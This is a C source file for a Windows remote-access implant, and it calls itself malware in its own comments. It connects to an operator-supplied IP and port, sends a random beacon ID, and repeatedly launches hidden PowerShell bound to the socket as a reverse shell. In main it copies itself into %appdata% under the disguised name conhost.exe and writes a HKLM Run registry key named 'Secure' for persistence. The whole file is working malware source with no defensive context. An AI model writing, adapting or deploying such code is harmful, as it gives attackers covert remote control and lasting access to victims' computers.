#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <rpcdce.h>
#include <wincrypt.h>
#include <stdbool.h>
#include <time.h>
#include <processthreadsapi.h>


#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "rpcrt4.lib")


BOOL send_all(int socket, void *buffer, size_t length)
{
    char *ptr = (char*) buffer;
    while (length > 0)
    {
        int i = send(socket, ptr, length, 0);
        if (i < 1) return false;
        ptr += i;
        length -= i;
    }
    return true;
}


char* gen_uuid() {
    char v[] = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'};
    //3fb17ebc-bc38-4939-bc8b-74f2443281d4
    //8 dash 4 dash 4 dash 4 dash 12
    static char buf[37] = {0};

    //gen random for all spaces because lazy
    srand(time(0));
    for(int i = 0; i < 36; ++i) {
        buf[i] = v[rand()%16];
    }

    //put dashes in place
    buf[8] = '-';
    buf[13] = '-';
    buf[18] = '-';
    buf[23] = '-';

    //needs end byte
    buf[36] = '\0';

    return buf;
}




void beacon_connect_to_server(char IP[16], int PORT){
    WSADATA wsaData;
	if (WSAStartup(MAKEWORD(2 ,2), &wsaData) != 0) {
		printf("[ERROR] WSASturtup failed.\n");
	}


    // INIT SOCKET = AF_INET (IPv4), SOCK_STREAM (Stream), IPPROTO_TCP (TCP)
    SOCKET s =  WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0); 

    // IP+PORT SPEC
    int iResult;
    int jResult;
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(IP);
    clientService.sin_port = htons(PORT);

    // Connect to server.
    iResult = connect(s, (struct sockaddr*) &clientService, sizeof (clientService));

    // Generate and send beacon metadata  
    int recvbuflen = 1048576;
    char *sendbuf = gen_uuid();
    char recvbuf[recvbuflen];


    send_all(s, sendbuf, (int)strlen(sendbuf)); 
  
    
    
    // Receive until the peer closes the connection
    
    iResult = recv(s, recvbuf, recvbuflen, 0);

    // Executing commands
    
    while(1) {
        STARTUPINFO sinfo;
        memset(&sinfo, 0, sizeof(sinfo));
        sinfo.cb = sizeof(sinfo);
        sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
        sinfo.hStdInput = (HANDLE)s;
        sinfo.hStdOutput = (HANDLE)s;
        sinfo.hStdError = (HANDLE)s;
        PROCESS_INFORMATION pinfo;
        char proc[] = "powershell.exe -WindowStyle Hidden";
        CreateProcessA(NULL, proc, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
        WaitForSingleObject(pinfo.hProcess, INFINITE);
        CloseHandle(pinfo.hProcess);
        CloseHandle(pinfo.hThread);
        memset((void *) s, 0, sizeof(s));

    }
    
    
    
    // Close the socket
    iResult = shutdown(s, SD_SEND);
    printf("%d", iResult);
    jResult = closesocket(s);
    printf("%d", jResult);

    // Random print
    printf("bobs & vagene %s:%d\n", IP, PORT);

}


// MIGHT ADD LATER
// Get LOCAL IP ADRESSES: Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Filter IPENABLED=TRUE | Select IPAddress
// Get Public IP ADRESSES: $myip = Invoke-WebRequest -UseBasicParsing -URI ifconfig.me; $myip.content

int main(int argc, char *argv[]) {
    if( argc == 3 ) {
        char IP [16]; strcpy(IP, argv[1]);
        int PORT = atoi(argv[2]);
        //printf("asasasasasa");

        system("cmd /c copy .\\conhost.exe %appdata%");  // copy malware to appdata
        system("cmd /c REG ADD HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Secure\" /t REG_SZ /F /D \"%appdata%\\conhost.exe"); //add registry persistence 
        beacon_connect_to_server(IP, PORT);
    }
    else if( argc > 3 ) {
        printf("Too many arguments supplied.\n");
    }
    else {
        printf("Two argument expected.\n");
    }
    return 0;
}